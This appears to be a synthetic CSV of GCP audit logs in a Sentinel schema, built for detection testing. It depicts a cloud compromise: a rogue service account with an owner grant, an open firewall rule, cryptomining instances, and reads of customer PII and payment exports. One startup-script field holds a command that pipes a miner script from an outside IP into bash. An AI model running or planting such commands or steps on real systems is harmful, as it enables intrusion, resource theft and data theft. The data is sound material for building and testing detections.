TimeGenerated,Timestamp,LogName,ServiceName,MethodName,GCPResourceName,GCPResourceType,ProjectId,PrincipalEmail,AuthenticationInfo,AuthorizationInfo,Request,Response,RequestMetadata,ResourceLocation,ResourceOriginalState,Metadata,ServiceData,Status,StatusMessage,NumResponseItems,InsertId,Severity,Subscription,SourceSystem,TenantId,Type
2025-12-15T07:30:00Z,2025-12-15T07:30:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,iam.googleapis.com,google.iam.admin.v1.CreateServiceAccount,projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com,iam_service_account,contoso-prod-01,compromised-dev@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""compromised-dev@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""iam.serviceAccounts.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.CreateServiceAccountRequest"", ""name"": ""projects/contoso-prod-01"", ""accountId"": ""exfil-sa"", ""serviceAccount"": {""displayName"": ""Data Export Service""}}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.ServiceAccount"", ""name"": ""projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""email"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""uniqueId"": ""112233445566778899""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-abc123def456,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T07:31:15Z,2025-12-15T07:31:15Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,iam.googleapis.com,google.iam.admin.v1.CreateServiceAccountKey,projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com/keys/aabbccdd1122,iam_service_account_key,contoso-prod-01,compromised-dev@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""compromised-dev@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""iam.serviceAccountKeys.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.CreateServiceAccountKeyRequest"", ""name"": ""projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""privateKeyType"": ""TYPE_GOOGLE_CREDENTIALS_FILE"", ""keyAlgorithm"": ""KEY_ALG_RSA_2048""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.ServiceAccountKey"", ""name"": ""projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com/keys/aabbccdd1122"", ""validAfterTime"": ""2025-12-15T07:31:15Z"", ""validBeforeTime"": ""2027-12-15T07:31:15Z"", ""keyAlgorithm"": ""KEY_ALG_RSA_2048""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-bcd234efg567,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T07:32:45Z,2025-12-15T07:32:45Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,cloudresourcemanager.googleapis.com,SetIamPolicy,projects/contoso-prod-01,project,contoso-prod-01,compromised-dev@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""compromised-dev@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""resourcemanager.projects.setIamPolicy"", ""granted"": true, ""resource"": ""projects/contoso-prod-01""}","{""@type"": ""type.googleapis.com/google.iam.v1.SetIamPolicyRequest"", ""policy"": {""bindings"": [{""role"": ""roles/owner"", ""members"": [""serviceAccount:exfil-sa@contoso-prod-01.iam.gserviceaccount.com""]}]}, ""updateMask"": ""bindings""}","{""@type"": ""type.googleapis.com/google.iam.v1.Policy"", ""bindings"": [{""role"": ""roles/owner"", ""members"": [""serviceAccount:exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""user:admin@contoso.com""]}]}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-cde345fgh678,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:00:22Z,2025-12-15T08:00:22Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.firewalls.insert,projects/contoso-prod-01/global/firewalls/allow-all-ingress,gce_firewall_rule,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com/keys/aabbccdd1122""}","{""permission"": ""compute.firewalls.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/global/firewalls/allow-all-ingress""}","{""@type"": ""type.googleapis.com/compute.firewalls.insert"", ""name"": ""allow-all-ingress"", ""direction"": ""INGRESS"", ""allowed"": [{""IPProtocol"": ""tcp"", ""ports"": [""0-65535""]}], ""sourceRanges"": [""0.0.0.0/0""], ""network"": ""projects/contoso-prod-01/global/networks/default"", ""priority"": 100}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-fw-insert-001"", ""name"": ""operation-fw-insert-001"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-def456ghi789,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:05:10Z,2025-12-15T08:05:10Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.insert,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01,gce_instance,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com/keys/aabbccdd1122""}","{""permission"": ""compute.instances.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01""}","{""@type"": ""type.googleapis.com/compute.instances.insert"", ""name"": ""crypto-worker-01"", ""machineType"": ""projects/contoso-prod-01/zones/us-central1-a/machineTypes/n2-highcpu-96"", ""disks"": [{""initializeParams"": {""sourceImage"": ""projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20251201""}}], ""networkInterfaces"": [{""network"": ""projects/contoso-prod-01/global/networks/default"", ""accessConfigs"": [{""type"": ""ONE_TO_ONE_NAT"", ""name"": ""External NAT""}]}]}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-inst-insert-001"", ""name"": ""operation-inst-insert-001"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-efg567hij890,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:05:55Z,2025-12-15T08:05:55Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.insert,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02,gce_instance,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/exfil-sa@contoso-prod-01.iam.gserviceaccount.com/keys/aabbccdd1122""}","{""permission"": ""compute.instances.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02""}","{""@type"": ""type.googleapis.com/compute.instances.insert"", ""name"": ""crypto-worker-02"", ""machineType"": ""projects/contoso-prod-01/zones/us-central1-a/machineTypes/n2-highcpu-96"", ""disks"": [{""initializeParams"": {""sourceImage"": ""projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20251201""}}], ""networkInterfaces"": [{""network"": ""projects/contoso-prod-01/global/networks/default"", ""accessConfigs"": [{""type"": ""ONE_TO_ONE_NAT"", ""name"": ""External NAT""}]}]}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-inst-insert-002"", ""name"": ""operation-inst-insert-002"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-fgh678ijk901,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:15:00Z,2025-12-15T08:15:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.setMetadata,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01,gce_instance,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""compute.instances.setMetadata"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01""}","{""@type"": ""type.googleapis.com/compute.instances.setMetadata"", ""metadata"": {""items"": [{""key"": ""startup-script"", ""value"": ""#!/bin/bash\ncurl -s http://203.0.113.50:8080/miner.sh | bash""}]}}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-ghi789jkl012,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:00:33Z,2025-12-15T09:00:33Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.list,projects/_/buckets/contoso-customer-data,gcs_bucket,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""storage.objects.list"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data""}","{""@type"": ""type.googleapis.com/storage.objects.list"", ""bucket"": ""contoso-customer-data""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,847,ins-hij890klm123,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:02:15Z,2025-12-15T09:02:15Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.get,projects/_/buckets/contoso-customer-data/objects/exports/customer-pii-2025.csv,gcs_bucket,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""storage.objects.get"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data/objects/exports/customer-pii-2025.csv""}","{""@type"": ""type.googleapis.com/storage.objects.get"", ""bucket"": ""contoso-customer-data"", ""object"": ""exports/customer-pii-2025.csv""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-ijk901lmn234,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:02:48Z,2025-12-15T09:02:48Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.get,projects/_/buckets/contoso-customer-data/objects/exports/payment-records-2025.csv,gcs_bucket,contoso-prod-01,exfil-sa@contoso-prod-01.iam.gserviceaccount.com,"{""principalEmail"": ""exfil-sa@contoso-prod-01.iam.gserviceaccount.com""}","{""permission"": ""storage.objects.get"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data/objects/exports/payment-records-2025.csv""}","{""@type"": ""type.googleapis.com/storage.objects.get"", ""bucket"": ""contoso-customer-data"", ""object"": ""exports/payment-records-2025.csv""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-jkl012mno345,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
